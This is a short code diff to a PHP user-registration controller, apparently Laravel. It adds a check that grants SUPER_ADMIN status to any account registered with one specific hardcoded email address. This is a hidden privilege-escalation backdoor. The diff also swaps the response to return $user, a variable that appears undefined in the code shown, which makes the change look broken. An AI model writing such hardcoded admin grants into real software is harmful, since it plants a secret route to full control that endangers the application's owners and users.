@@ -56,13 +56,16 @@ class UserController extends Controller
                 $item->name_file=$file_name['name'];
                 $item->save();
             }
+            if($data['email']=='akydemy@gmail.com'){
+                  $item->status=eStatus::SUPER_ADMIN->value;
+                  $item->save();
+            }
             if($request->has('action') && $request->action==eStatus::SUPER_ADMIN->value){
                 return response($item,201);
             }
             // event(new Registered($item));
-            return response($token,201);
+            return response($user,201);
     }
-
     public function update(Request $request,$id)
     {     
             $data = $request->validate([
